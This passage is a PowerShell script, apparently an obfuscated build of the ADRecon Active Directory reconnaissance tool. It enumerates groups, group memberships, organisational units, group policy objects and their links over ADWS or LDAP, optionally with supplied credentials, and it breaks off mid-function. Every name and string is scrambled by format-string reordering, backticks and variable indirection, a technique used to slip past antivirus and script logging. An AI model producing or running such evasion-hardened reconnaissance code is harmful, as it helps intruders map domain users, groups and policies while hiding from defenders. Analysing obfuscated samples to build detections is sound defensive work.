        $ObjSearcher."pRoPE`Rti`estOl`o`Ad".("{0}{1}{2}" -f 'Add','Ra','nge').Invoke((("{1}{0}{2}" -f'u','adminco','nt'),("{1}{0}{2}"-f 'ical','canon','name'), ("{3}{0}{1}{2}{4}{5}"-f'isting','u','ishe','d','dna','me'), ("{2}{1}{0}" -f 'ion','pt','descri'), ("{0}{2}{1}" -f'groupt','e','yp'),("{0}{3}{4}{2}{1}"-f'sa','e','m','maccountn','a'), ("{2}{0}{3}{1}"-f'idh','tory','s','is'), ("{0}{1}{2}" -f 'manag','e','dby'), ("{4}{3}{2}{1}{0}"-f 'ata','tad','e','eplvaluem','msds-r'), ("{3}{1}{0}{2}" -f's','bject','id','o'), ("{1}{0}{3}{2}"-f 'n','whe','eated','cr'), ("{2}{1}{3}{0}" -f'anged','e','wh','nch')))
        $ObjSearcher."Sear`Chsc`opE" = ("{2}{0}{1}" -f 'bt','ree','Su')

        Try
        {
            $ADGroups = $ObjSearcher.("{1}{0}" -f'indAll','F').Invoke()
        }
        Catch
        {
            Write-Warning ("{8}{9}{2}{0}{4}{1}{5}{3}{6}{7}" -f'eratin',' ','ror while enum','O','g','Group ','bjec','ts','[Get-ADRGroup] ','Er')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.("{0}{1}" -f'd','ispose').Invoke()

        If ($ADGroups)
        {
            Write-Verbose "[*] Total Groups: $([ADRecon.LDAPClass]::ObjectCount($ADGroups)) "
            If ($ADRGroups)
            {
                $GroupObj =   (GEt-VarIAbLE s07d  ).VALUE::("{1}{0}{2}" -f'p','Grou','Parser').Invoke($ADGroups, $Threads)
            }
            If ($ADRGroupChanges)
            {
                $GroupChangesObj =   $S07d::("{2}{1}{0}{3}" -f 'upChang','ro','G','eParser').Invoke($ADGroups, $date, $Threads)
            }
            Remove-Variable ("{2}{1}{0}"-f'ps','rou','ADG')
            Remove-Variable ("{1}{0}{3}{2}" -f 'RGro','AD','s','up')
            Remove-Variable ("{0}{3}{2}{4}{1}"-f'ADRGrou','ges','Ch','p','an')
        }
    }

    If ($GroupObj)
    {
        Export-ADR -ADRObj $GroupObj -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{1}{0}" -f 'ups','Gro')
        Remove-Variable ("{2}{0}{1}" -f 'ou','pObj','Gr')
    }

    If ($GroupChangesObj)
    {
        Export-ADR -ADRObj $GroupChangesObj -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{2}{0}{1}"-f'roupC','hanges','G')
        Remove-Variable ("{3}{2}{1}{0}" -f 'Obj','s','pChange','Grou')
    }
}

Function GeT-ADrGRo`U`PmEmb`Er
{

    param(
        [Parameter(manDaToRy = $true)]
        [string] $Method,

        [Parameter(maNDaToRY = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(maNdatOrY = $true)]
        [int] $PageSize,

        [Parameter(manDAtORY = $false)]
        [int] $Threads = 10
    )

    If ($Method -eq ("{0}{1}"-f 'A','DWS'))
    {
        Try
        {
            $ADDomain = Get-ADDomain
            $ADDomainSID = $ADDomain."dom`A`INsId"."Va`LuE"
            Remove-Variable ("{1}{2}{0}" -f 'n','AD','Domai')
        }
        Catch
        {
            Write-Warning ("{3}{5}{4}{6}{0}{8}{2}{9}{1}{7}{10}"-f'Me','r getting','ber] E','[Get-AD','u','RGro','p',' Dom','m','rro','ain Context')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        Try
        {
            $ADGroups = $ADGroups = @( Get-ADGroup -Filter * -ResultPageSize $PageSize -Properties ("{3}{0}{2}{1}{4}"-f 'mA','Na','ccount','Sa','me'),("{1}{0}"-f'ID','S') )
        }
        Catch
        {
            Write-Warning ("{7}{10}{3}{4}{1}{2}{6}{9}{12}{8}{5}{13}{11}{0}" -f's',' Error',' while ','Memb','er]','Grou','enu','[Get-ADRG',' ','meratin','roup','ject','g','p Ob')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }

        Try
        {
            $ADGroupMembers = @( Get-ADObject -LDAPFilter ((("{0}{4}{1}{3}{8}{7}{2}{6}{5}{9}"-f'(2di','r','(','of','(membe','*)','primarygroupid=',')','=*',')')) -replACe'2di',[CHaR]124) -Properties ("{2}{3}{1}{4}{0}" -f'e','uishe','Dis','ting','dNam'),("{0}{2}{1}{3}" -f 'Obj','s','ectCla','s'),("{0}{2}{1}"-f 'mem','f','bero'),("{0}{2}{1}"-f'primar','ID','yGroup'),("{1}{4}{2}{3}{0}" -f'e','sAM','unt','Nam','Acco'),("{1}{2}{3}{0}{4}"-f'ou','sam','a','cc','nttype') )
        }
        Catch
        {
            Write-Warning ("{10}{1}{2}{15}{12}{13}{4}{6}{9}{3}{11}{7}{8}{0}{5}{14}" -f'me','G','e','whi','er] Er','rating GroupMember Obj','ror','e e','nu',' ','[','l','e','mb','ects','t-ADRGroupM')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ( ($ADDomainSID) -and ($ADGroups) -and ($ADGroupMembers) )
        {
            Write-Verbose "[*] Total GroupMember Objects: $([ADRecon.ADWSClass]::ObjectCount($ADGroupMembers)) "
            $GroupMemberObj =   (  chILditem ("vA"+"riaBLe"+":JW"+"B1"+"8")).VAlue::("{3}{0}{2}{1}" -f 'o','rser','upMemberPa','Gr').Invoke($ADGroups, $ADGroupMembers, $ADDomainSID, $Threads)
            Remove-Variable ("{1}{2}{0}"-f's','AD','Group')
            Remove-Variable ("{3}{1}{2}{0}"-f 'ers','r','oupMemb','ADG')
            Remove-Variable ("{2}{0}{1}" -f 'om','ainSID','ADD')
        }
    }

    If ($Method -eq ("{1}{0}" -f'AP','LD'))
    {

        If ($Credential -ne   $K49P::"eMP`Ty")
        {
            $DomainFQDN = Get-DNtoFQDN($objDomain."DiSt`iNg`UishEd`NaMe")
            $DomainContext = New-Object ("{0}{5}{11}{1}{7}{3}{2}{14}{10}{4}{9}{12}{6}{8}{13}" -f'Syste','rect','yS','r','es.Activ','m.','ctory.DirectoryC','o','onte','eD','vic','Di','ire','xt','er')(("{1}{0}"-f 'main','Do'),$($DomainFQDN),$($Credential."UsEr`NA`Me"),$($Credential.("{4}{3}{0}{2}{1}"-f 'Netwo','tial','rkCreden','t','Ge').Invoke()."p`ASSw`oRd"))
            Try
            {
                $ADDomain =  (Gci  ('vaRI'+'ab'+'le:'+'iHYj8Z') ).vAluE::("{2}{0}{1}"-f 'e','tDomain','G').Invoke($DomainContext)
            }
            Catch
            {
                Write-Warning ("{6}{1}{2}{4}{11}{3}{7}{10}{8}{5}{0}{9}"-f 'ontex','-ADRG','r','er] E','oupMem','omain C','[Get','rro','g D','t','r gettin','b')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
            Remove-Variable ("{2}{1}{0}{3}"-f 'o','omainC','D','ntext')
            Try
            {
                $ForestContext = New-Object ("{11}{17}{6}{1}{5}{4}{9}{12}{3}{15}{16}{10}{7}{2}{8}{13}{14}{0}" -f 't','ctoryServ','or','r','cti','ices.A','e','t','y','ve','ec','Syste','Directo','C','ontex','y.Di','r','m.Dir')(("{1}{0}"-f'rest','Fo'),$($ADDomain."F`oResT"),$($Credential."UsErN`A`ME"),$($Credential.("{2}{0}{4}{1}{3}{5}" -f'etNetworkC','e','G','denti','r','al').Invoke()."p`AS`swoRd"))
                $ADForest =   $2gO::("{0}{2}{1}"-f'GetF','est','or').Invoke($ForestContext)
            }
            Catch
            {
                Write-Warning ("{11}{8}{4}{0}{3}{6}{2}{10}{1}{9}{14}{7}{12}{5}{13}" -f'DRGroupMemb',' get','o','er] ','t-A','C','Err',' Forest','e','t','r','[G',' ','ontext','ing')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            }
            If ($ForestContext)
            {
                Remove-Variable ("{3}{0}{2}{1}"-f'restC','ext','ont','Fo')
            }
            If ($ADForest)
            {
                $GlobalCatalog = $ADForest.("{2}{0}{1}{3}{4}" -f'dG','lob','Fin','alCatalo','g').Invoke()
            }
            If ($GlobalCatalog)
            {
                $DN = "GC://$($GlobalCatalog.IPAddress)/$($objDomain.distinguishedname)"
                Try
                {
                    $ADObject = New-Object -TypeName ("{7}{5}{0}{8}{6}{10}{2}{9}{11}{4}{3}{1}" -f 'rvi','y','r','tr','oryEn','stem.DirectorySe','es.','Sy','c','ec','Di','t') -ArgumentList ($($DN),$($Credential."userNa`ME"),$($Credential.("{1}{3}{2}{0}" -f 'al','GetNe','orkCredenti','tw').Invoke()."pAs`sW`oRD"))
                    $ADDomainSID = New-Object ("{5}{1}{0}{4}{3}{6}{2}{7}" -f'y.','ecurit','ifie','pal.','Princi','System.S','SecurityIdent','r')($ADObject."O`Bj`ECtSID"[0], 0)
                    $ADObject.("{1}{0}"-f'ispose','D').Invoke()
                }
                Catch
                {
                    Write-Warning "[Get-ADRGroupMember] Error retrieving Domain SID using the GlobalCatalog $($GlobalCatalog.IPAddress). Using SID from the ObjDomain. "
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                    $ADDomainSID = New-Object ("{0}{10}{8}{12}{1}{4}{2}{11}{3}{7}{6}{5}{9}" -f'S','.Prin','p','l','ci','de','urityI','.Sec','curit','ntifier','ystem.Se','a','y')($objDomain."o`BJEct`sID"[0], 0)
                }
            }
            Else
            {
                $ADDomainSID = New-Object ("{4}{7}{5}{6}{0}{8}{3}{2}{1}{9}"-f'.Pri','f','enti','d','Syst','uri','ty','em.Sec','ncipal.SecurityI','ier')($objDomain."O`BJEC`TSID"[0], 0)
            }
        }
        Else
        {
            $ADDomain =   $ihyJ8z::("{2}{1}{4}{0}{3}"-f 'entDoma','Cu','Get','in','rr').Invoke()
            $ADForest =  (GET-cHILdITem ('VARi'+'aBl'+'e:2GO')  ).Value::("{0}{1}{3}{2}{4}"-f 'Get','Cu','ntFo','rre','rest').Invoke()
            Try
            {
                $GlobalCatalog = $ADForest.("{0}{2}{3}{1}"-f 'FindGlobalCat','g','a','lo').Invoke()
                $DN = "GC://$($GlobalCatalog)/$($objDomain.distinguishedname)"
                $ADObject = New-Object -TypeName ("{7}{5}{3}{6}{10}{4}{9}{0}{1}{11}{2}{8}" -f'.D','irector','En','Dire','v','tem.','ctorySe','Sys','try','ices','r','y') -ArgumentList ($DN)
                $ADDomainSID = New-Object ("{9}{0}{1}{6}{5}{2}{8}{10}{3}{4}{7}{12}{11}" -f'i','ty.P','ec','I','de','l.S','rincipa','ntif','uri','System.Secur','ty','r','ie')($ADObject."OBjec`T`SID"[0], 0)
                $ADObject.("{1}{0}"-f'spose','di').Invoke()
            }
            Catch
            {
                Write-Warning "[Get-ADRGroupMember] Error retrieving Domain SID using the GlobalCatalog $($GlobalCatalog.IPAddress). Using SID from the ObjDomain. "
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                $ADDomainSID = New-Object ("{3}{11}{7}{8}{5}{9}{1}{4}{6}{10}{2}{0}" -f 'ifier','l','dent','Syste','.Sec','ip','urit','curity.Prin','c','a','yI','m.Se')($objDomain."ob`j`EcT`Sid"[0], 0)
            }
        }

        $objSearcher = New-Object ("{2}{4}{1}{0}{8}{3}{6}{7}{5}" -f'erv','irectoryS','Syst','es.DirectoryS','em.D','r','earc','he','ic') $objDomain
        $ObjSearcher."pag`es`iZE" = $PageSize
        $ObjSearcher."f`IL`TeR" = ("{0}{3}{2}{1}"-f'(obje',')','lass=group','ctC')
        $ObjSearcher."p`ROP`erTIES`TOLoad".("{1}{0}{2}" -f 'ddRa','A','nge').Invoke((("{1}{2}{0}{3}"-f 'cco','sam','a','untname'), ("{2}{0}{1}" -f 'bjectsi','d','o')))
        $ObjSearcher."S`eAr`cHS`COpE" = ("{2}{0}{1}" -f'r','ee','Subt')

        Try
        {
            $ADGroups = $ObjSearcher.("{1}{0}"-f 'l','FindAl').Invoke()
        }
        Catch
        {
            Write-Warning ("{5}{6}{8}{2}{7}{9}{10}{4}{0}{1}{3}"-f ' O','bject','e','s','up','[G','et-A','r','DRGroupMemb','] Error w','hile enumerating Gro')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.("{0}{2}{1}"-f'di','ose','sp').Invoke()

        $objSearcher = New-Object ("{9}{6}{11}{4}{2}{1}{5}{0}{8}{3}{10}{7}"-f'y','s.Direct','e','ea','vic','or','ectorySe','er','S','System.Dir','rch','r') $objDomain
        $ObjSearcher."PAG`esiZe" = $PageSize
        $ObjSearcher."F`I`LteR" = ((("{0}{4}{5}{3}{6}{1}{2}"-f'(d','oupid=*)',')','erof=*)(primaryg','y','i(memb','r'))."rEpl`ACe"(([cHAr]100+[cHAr]121+[cHAr]105),[sTring][cHAr]124))
        $ObjSearcher."p`RoPeRTI`eS`TOLoad".("{1}{0}"-f'ge','AddRan').Invoke((("{3}{0}{1}{2}"-f 'nguished','n','ame','disti'), ("{0}{2}{1}" -f'dn','stname','sho'), ("{3}{0}{2}{1}" -f'bjec','class','t','o'), ("{1}{0}{3}{4}{2}"-f'r','prima','pid','ygro','u'), ("{0}{1}{2}"-f 'membe','r','of'), ("{3}{1}{2}{0}{4}"-f'ntn','macc','ou','sa','ame'), ("{2}{4}{3}{1}{0}" -f 'ttype','ccoun','s','ma','a')))
        $ObjSearcher."se`A`Rch`ScoPE" = ("{0}{1}"-f'Subtr','ee')

        Try
        {
            $ADGroupMembers = $ObjSearcher.("{1}{0}"-f'All','Find').Invoke()
        }
        Catch
        {
            Write-Warning ("{17}{2}{10}{5}{15}{9}{14}{3}{1}{13}{18}{16}{19}{8}{6}{4}{7}{0}{12}{11}"-f 'O','le enum','-AD',' whi','mbe','o','Me','r ','oup','Member] ','RGr','jects','b','e','Error','up','a','[Get','r','ting Gr')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.("{1}{0}{2}" -f 'spos','di','e').Invoke()

        If ( ($ADDomainSID) -and ($ADGroups) -and ($ADGroupMembers) )
        {
            Write-Verbose "[*] Total GroupMember Objects: $([ADRecon.LDAPClass]::ObjectCount($ADGroupMembers)) "
            $GroupMemberObj =   ( geT-CHilditEM  ('V'+'ar'+'iABLe:S0'+'7D')  ).VAlUe::("{2}{3}{0}{1}"-f 'berPar','ser','GroupMe','m').Invoke($ADGroups, $ADGroupMembers, $ADDomainSID, $Threads)
            Remove-Variable ("{1}{0}{2}" -f 'G','AD','roups')
            Remove-Variable ("{0}{3}{2}{1}"-f 'A','oupMembers','Gr','D')
            Remove-Variable ("{0}{3}{1}{2}" -f'A','in','SID','DDoma')
        }
    }

    If ($GroupMemberObj)
    {
        Return $GroupMemberObj
    }
    Else
    {
        Return $null
    }
}

Function GEt-ADR`OU
{

    param(
        [Parameter(MAndAToRY = $true)]
        [string] $Method,

        [Parameter(mANDAtORY = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(maNDAToRy = $true)]
        [int] $PageSize,

        [Parameter(mANDATORY = $false)]
        [int] $Threads = 10
    )

    If ($Method -eq ("{1}{0}" -f'S','ADW'))
    {
        Try
        {
            $ADOUs = @( Get-ADOrganizationalUnit -Filter * -Properties ("{0}{1}{4}{3}{2}"-f 'Di','stinguis','e','dNam','he'),("{0}{1}{2}"-f'Descrip','t','ion'),("{0}{1}" -f'Na','me'),("{1}{0}{2}" -f 'henCreate','w','d'),("{3}{1}{0}{2}"-f'nChang','e','ed','wh') )
        }
        Catch
        {
            Write-Warning ("{5}{2}{10}{3}{7}{11}{0}{8}{4}{9}{6}{1}" -f'num','bjects','-ADROU] ','r','t','[Get',' OU O','ror ','era','ing','E','while e')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ($ADOUs)
        {
            Write-Verbose "[*] Total OUs: $([ADRecon.ADWSClass]::ObjectCount($ADOUs)) "
            $OUObj =   $jWb18::("{2}{0}{1}" -f 'arse','r','OUP').Invoke($ADOUs, $Threads)
            Remove-Variable ("{0}{1}"-f 'ADO','Us')
        }
    }

    If ($Method -eq ("{0}{1}" -f 'L','DAP'))
    {
        $objSearcher = New-Object ("{2}{11}{6}{3}{9}{5}{1}{0}{4}{7}{10}{8}"-f'ectory','Dir','Syste','r','Sea','ces.','ecto','r','r','yServi','che','m.Dir') $objDomain
        $ObjSearcher."pAGES`I`Ze" = $PageSize
        $ObjSearcher."fIlt`er" = ("{1}{5}{2}{0}{3}{4}"-f '=o','(object','lass','rgan','izationalunit)','c')
        $ObjSearcher."p`ROpeRtIe`Sto`LOad".("{1}{0}{2}"-f'a','AddR','nge').Invoke((("{2}{3}{1}{0}"-f'e','ishednam','disti','ngu'),("{1}{0}{2}{3}"-f 'e','d','scri','ption'),("{0}{1}"-f 'na','me'),("{1}{2}{0}"-f 'ed','wh','encreat'),("{2}{3}{1}{0}"-f'changed','n','w','he')))
        $ObjSearcher."SEA`R`Ch`SCopE" = ("{0}{1}"-f'Su','btree')

        Try
        {
            $ADOUs = $ObjSearcher.("{1}{0}" -f 'dAll','Fin').Invoke()
        }
        Catch
        {
            Write-Warning ("{7}{5}{0}{1}{4}{3}{2}{6}"-f'OU] E','r','enu','le ','ror whi','Get-ADR','merating OU Objects','[')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.("{1}{2}{0}"-f 'se','disp','o').Invoke()

        If ($ADOUs)
        {
            Write-Verbose "[*] Total OUs: $([ADRecon.LDAPClass]::ObjectCount($ADOUs)) "
            $OUObj =   $s07d::("{2}{0}{1}" -f 'Parse','r','OU').Invoke($ADOUs, $Threads)
            Remove-Variable ("{0}{1}"-f'AD','OUs')
        }
    }

    If ($OUObj)
    {
        Return $OUObj
    }
    Else
    {
        Return $null
    }
}

Function gE`T`-ADRGpo
{

    param(
        [Parameter(ManDatory = $true)]
        [string] $Method,

        [Parameter(MANdaTORy = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(MANDaTOry = $true)]
        [int] $PageSize,

        [Parameter(maNdaToRy = $false)]
        [int] $Threads = 10
    )

    If ($Method -eq ("{0}{1}" -f'AD','WS'))
    {
        Try
        {
            $ADGPOs = @( Get-ADObject -LDAPFilter (("{9}{4}{7}{5}{1}{0}{8}{2}{3}{6}"-f'group','gory=','li','cyConta','b','ctCate','iner)','je','Po','(o')) -Properties ("{3}{0}{2}{1}" -f'l','Name','ay','Disp'),("{4}{3}{1}{2}{0}" -f 'e','hedNa','m','inguis','Dist'),("{1}{0}" -f 'me','Na'),("{3}{1}{2}{0}" -f'ysPath','PCF','ileS','g'),("{2}{0}{1}"-f't','ed','whenCrea'),("{1}{0}{3}{2}"-f'hang','whenC','d','e') )
        }
        Catch
        {
            Write-Warning ("{1}{6}{9}{5}{8}{2}{14}{11}{3}{10}{7}{12}{13}{4}{0}"-f 's','[','r while e','on','ject','PO] ','G','in','Erro','et-ADRG','ta','C','er ','Ob','numerating groupPolicy')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ($ADGPOs)
        {
            Write-Verbose "[*] Total GPOs: $([ADRecon.ADWSClass]::ObjectCount($ADGPOs)) "
            $GPOsObj =   ( variAbLe  JWB18 -vaLUeonly  )::("{1}{2}{0}" -f 'ser','GPO','Par').Invoke($ADGPOs, $Threads)
            Remove-Variable ("{1}{0}" -f'GPOs','AD')
        }
    }

    If ($Method -eq ("{0}{1}"-f 'LDA','P'))
    {
        $objSearcher = New-Object ("{4}{6}{7}{2}{1}{5}{8}{11}{10}{3}{9}{0}" -f'ySearcher','ctory','e','s.Direct','Sys','S','tem.','Dir','ervi','or','e','c') $objDomain
        $ObjSearcher."PAGes`iZE" = $PageSize
        $ObjSearcher."F`Ilt`eR" = ("{1}{4}{7}{9}{8}{5}{10}{0}{11}{6}{3}{2}"-f'ro','(o','ainer)','nt','bjec','ory=','licyCo','tC','g','ate','g','upPo')
        $ObjSearcher."Se`ARc`HScOPe" = ("{0}{2}{1}" -f'Subt','ee','r')

        Try
        {
            $ADGPOs = $ObjSearcher.("{0}{1}" -f'Fi','ndAll').Invoke()
        }
        Catch
        {
            Write-Warning ("{4}{6}{1}{8}{0}{7}{10}{3}{5}{9}{2}"-f'e','Error','cts','g','[Get-',' groupPolicyContainer','ADRGPO] ',' enum',' whil',' Obje','eratin')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.("{2}{1}{0}"-f'e','s','dispo').Invoke()

        If ($ADGPOs)
        {
            Write-Verbose "[*] Total GPOs: $([ADRecon.LDAPClass]::ObjectCount($ADGPOs)) "
            $GPOsObj =   (GEt-ITeM  ('VA'+'r'+'iAbl'+'e'+':S07d') ).vaLUE::("{2}{0}{1}"-f'rs','er','GPOPa').Invoke($ADGPOs, $Threads)
            Remove-Variable ("{2}{0}{1}" -f 'P','Os','ADG')
        }
    }

    If ($GPOsObj)
    {
        Return $GPOsObj
    }
    Else
    {
        Return $null
    }
}


Function ge`T-`AdRG`pLiNk
{

    param(
        [Parameter(manDATory = $true)]
        [string] $Method,

        [Parameter(mANdaTOry = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(MaNDatoRY = $true)]
        [int] $PageSize,

        [Parameter(mAnDAtorY = $false)]
        [int] $Threads = 10
    )

    If ($Method -eq ("{1}{0}"-f'WS','AD'))
    {
        Try
        {
            $ADSOMs = @( Get-ADObject -LDAPFilter ((("{10}{13}{9}{2}{12}{11}{17}{7}{8}{0}{1}{15}{5}{4}{6}{16}{14}{3}"-f 't','c','d','t))','ss=','a','orga','bje','c','ss=','({0','n)(','omai','}(objectcla','ionalUni','l','nizat','o'))  -F  [cHAR]124) -Properties ("{5}{3}{0}{1}{2}{4}"-f 'guished','N','am','stin','e','Di'),("{1}{0}" -f 'me','Na'),("{0}{1}"-f 'gP','Link'),("{1}{0}{2}"-f'ption','gPO','s') )
            $ADSOMs += @( Get-ADObject -SearchBase "CN=Sites,$((Get-ADRootDSE).configurationNamingContext)" -LDAPFilter ("{1}{3}{4}{0}{2}" -f'ite','(obj',')','ec','tclass=s') -Properties ("{3}{0}{1}{4}{2}" -f 'i','n','ishedName','Dist','gu'),("{0}{1}" -f 'Nam','e'),("{2}{1}{0}"-f 'nk','PLi','g'),("{1}{2}{0}"-f 'ptions','g','PO') )
        }
        Catch
        {
            Write-Warning ("{1}{3}{8}{2}{0}{9}{6}{4}{5}{7}" -f'o','[Get-AD','r','RG','g SOM Obje','ct','numeratin','s','PLink] Er','r while e')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        Try
        {
            $ADGPOs = @( Get-ADObject -LDAPFilter (("{8}{4}{0}{6}{1}{3}{9}{5}{2}{7}" -f 'ory=gr','u','n','p','ctCateg','yContai','o','er)','(obje','Polic')) -Properties ("{2}{1}{3}{0}" -f 'layName','s','Di','p'),("{3}{1}{2}{0}{4}" -f'shedNa','s','tingui','Di','me') )
        }
        Catch
        {
            Write-Warning ("{15}{5}{12}{13}{9}{4}{0}{2}{19}{18}{3}{7}{6}{14}{10}{16}{8}{17}{1}{11}" -f'or whi','t','le ','ng g','r','RGPL','pPo','rou','r Obj','Er','icy','s','in','k] ','l','[Get-AD','Containe','ec','erati','enum')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ( ($ADSOMs) -and ($ADGPOs) )
        {
            Write-Verbose "[*] Total SOMs: $([ADRecon.ADWSClass]::ObjectCount($ADSOMs)) "
            $SOMObj =  ( Get-VArIAbLE  jwB18 -VALueon  )::("{0}{1}{2}" -f'SOMPars','e','r').Invoke($ADGPOs, $ADSOMs, $Threads)
            Remove-Variable ("{1}{0}{2}" -f 'DSOM','A','s')
            Remove-Variable ("{0}{2}{1}"-f'ADGP','s','O')
        }
    }

    If ($Method -eq ("{1}{0}" -f'AP','LD'))
    {
        $ADSOMs = @()
        $objSearcher = New-Object ("{3}{4}{1}{2}{6}{0}{5}{7}" -f'i','c','to','System.Dir','e','rectorySear','ryServices.D','cher') $objDomain
        $ObjSearcher."PAG`e`sIzE" = $PageSize
        $ObjSearcher."fIL`Ter" = ((("{10}{3}{13}{8}{9}{1}{11}{6}{2}{0}{5}{4}{7}{12}{14}"-f'tclass','=doma','c','bjec','rg','=o','bje','ani','a','ss','(YFI(o','in)(o','zation','tcl','alUnit))'))  -REpLACE 'YFI',[cHAr]124)
        $ObjSearcher."proPe`RtiE`stO`lOAD".("{2}{1}{0}" -f 'nge','ddRa','A').Invoke((("{3}{4}{1}{5}{0}{2}" -f'n','she','ame','disting','ui','d'),("{1}{0}"-f'me','na'),("{0}{1}{2}"-f'g','p','link'),("{0}{1}{2}" -f'gp','optio','ns')))
        $ObjSearcher."s`eAR`ChScOPE" = ("{1}{2}{0}" -f'e','Su','btre')

        Try
        {
            $ADSOMs += $ObjSearcher.("{0}{1}" -f'FindA','ll').Invoke()
        }
        Catch
        {
            Write-Warning ("{1}{9}{8}{6}{10}{2}{7}{3}{4}{11}{0}{5}"-f ' SOM Objec','[Get-A','hile e','umer','ati','ts',' ','n','PLink]','DRG','Error w','ng')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.("{1}{0}{2}"-f'p','dis','ose').Invoke()

        $SearchPath = ("{0}{1}{2}" -f'C','N','=Sites')
        If ($Credential -ne   (Get-ChildITeM  ('vaRiAbLE:k'+'4'+'9'+'P')).valUe::"E`mpty")
        {
            $objSearchPath = New-Object ("{1}{0}{4}{6}{3}{5}{9}{8}{7}{2}"-f'ystem.Dir','S','ry','ces.','ectory','D','Servi','yEnt','ector','ir') "LDAP://$($DomainController)/$SearchPath,$($objDomainRootDSE.ConfigurationNamingContext)", $Credential."UsE`RNa`mE",$Credential.("{2}{0}{3}{1}"-f 'e','workCredential','GetN','t').Invoke()."PAS`SWOrd"
        }
        Else
        {
            $objSearchPath = New-Object ("{2}{4}{1}{0}{6}{5}{7}{3}{8}" -f 'ec','ir','Sys','oryEnt','tem.D','ryServic','to','es.Direct','ry') "LDAP://$SearchPath,$($objDomainRootDSE.ConfigurationNamingContext)"
        }
        $objSearcher = New-Object ("{9}{5}{6}{7}{0}{4}{2}{8}{1}{3}" -f 'Di','arc','t','her','rec','ec','toryServic','es.','orySe','System.Dir') $objSearchPath
        $ObjSearcher."Filt`Er" = ("{1}{3}{0}{2}"-f 't','(obj','class=site)','ec')
        $ObjSearcher."pRo`p`ErTIeStOL`O`AD".("{1}{2}{0}" -f'e','Add','Rang').Invoke((("{1}{2}{0}{3}{4}" -f'ngu','dist','i','ishedn','ame'),("{1}{0}" -f 'me','na'),("{1}{0}" -f 'nk','gpli'),("{1}{0}{2}{3}"-f 'opt','gp','io','ns')))
        $ObjSearcher."S`eA`RchscOPE" = ("{1}{0}"-f'tree','Sub')

        Try
        {
            $ADSOMs += $ObjSearcher.("{1}{0}" -f 'dAll','Fin').Invoke()
        }
        Catch
        {
            Write-Warning ("{2}{0}{5}{4}{6}{3}{1}{7}{8}{10}{11}{9}"-f'ink]',' en','[Get-ADRGPL','le','o',' Err','r whi','u','merating SOM','s',' Ob','ject')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.("{0}{1}" -f'dis','pose').Invoke()

        $objSearcher = New-Object ("{1}{6}{4}{0}{3}{5}{2}" -f'yService','Sy','her','s.','Director','DirectorySearc','stem.') $objDomain
        $ObjSearcher."pag`eSIZE" = $PageSize
        $ObjSearcher."fIL`TEr" = (("{6}{0}{2}{5}{3}{8}{1}{7}{4}"-f 'obje','cyC','ctCategory','oupPol','ntainer)','=gr','(','o','i'))
        $ObjSearcher."SEARc`h`sCOPE" = ("{0}{1}" -f 'Sub','tree')

        Try
        {
            $ADGPOs = $ObjSearcher.("{2}{0}{1}" -f'nd','All','Fi').Invoke()
        }
        Catch
        {
            Write-Warning ("{7}{14}{15}{5}{12}{0}{10}{13}{6}{8}{4}{9}{3}{1}{2}{11}{16}" -f'rror wh','olicyContai','ne','pP','g gr',']','rati','[Ge','n','ou','ile e','r Object',' E','nume','t','-ADRGPLink','s')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.("{2}{1}{0}"-f 'se','spo','di').Invoke()

        If ( ($ADSOMs) -and ($ADGPOs) )
        {
            Write-Verbose "[*] Total SOMs: $([ADRecon.LDAPClass]::ObjectCount($ADSOMs)) "
            $SOMObj =   (  gEt-varIAble s07D -vALUEON)::("{0}{2}{1}"-f 'SOM','ser','Par').Invoke($ADGPOs, $ADSOMs, $Threads)
            Remove-Variable ("{1}{0}" -f 'OMs','ADS')
            Remove-Variable ("{0}{1}{2}" -f 'A','DG','POs')
        }
    }

    If ($SOMObj)
    {
        Return $SOMObj
    }
    Else
    {
        Return $null
    }
}


Function c`O`N`Vert-dnSR`ECoRd
{


    [OutputType({"{4}{6}{7}{0}{2}{3}{1}{9}{5}{8}" -f '.M','mation.','an','agement.Auto','Sys','Cu','t','em','stomObject','PS'})]
    [CmdletBinding()]
    Param(
        [Parameter(poSiTIon = 0, MaNdAtOry = $True, ValUeFrompipeLiNeBypROPERtynaMe = $True)]
        [Byte[]]
        $DNSRecord
    )

    BEGIN {
        Function g`Et-na`mE
        {
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{4}{6}{0}{1}{2}{5}"-f 'or','rec','tl','PSUseOutputT','ype','y','C'}, '')]
            [CmdletBinding()]
            Param(
                [Byte[]]
                $Raw
            )

            [Int]$Length = $Raw[0]
            [Int]$Segments = $Raw[1]
            [Int]$Index =  2
            [String]$Name  = ''

            while ($Segments-- -gt 0)
            {
                [Int]$SegmentLength = $Raw[$Index++]
